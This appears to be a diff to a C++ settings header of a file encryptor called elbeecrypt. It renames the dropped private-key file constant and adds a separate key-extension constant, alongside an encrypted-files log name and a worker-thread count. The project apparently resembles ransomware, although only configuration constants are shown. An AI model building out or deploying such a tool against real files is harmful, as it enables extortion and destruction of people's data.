@@ -18,8 +18,11 @@ namespace elbeecrypt::common::Settings {
 	/** The name of the encrypted files log. */
 	const std::string ENCRYPTED_FILES_LIST_NAME = "elbeecrypt-encrypted.txt";
 
+	/** The extension of the private key to drop. */
+	const std::string ENCRYPTION_KEY_EXTENSION = "elbeecrypt-key";
+
 	/** The name of the private key to drop. */
-	const std::string ENCRYPTION_KEY_NAME = "elbeecrypt-privkey_%pubkeyFingerprint%.elbeecrypt-key";
+	const std::string ENCRYPTION_KEY_NAME = "elbeecrypt-key_%keyFingerprint%." + ENCRYPTION_KEY_EXTENSION;
 
 	/** The amount of worker threads that should be spawned to encrypt or decrypt files. */
 	constexpr uint8_t ENCRYPTION_THREADS = 10;
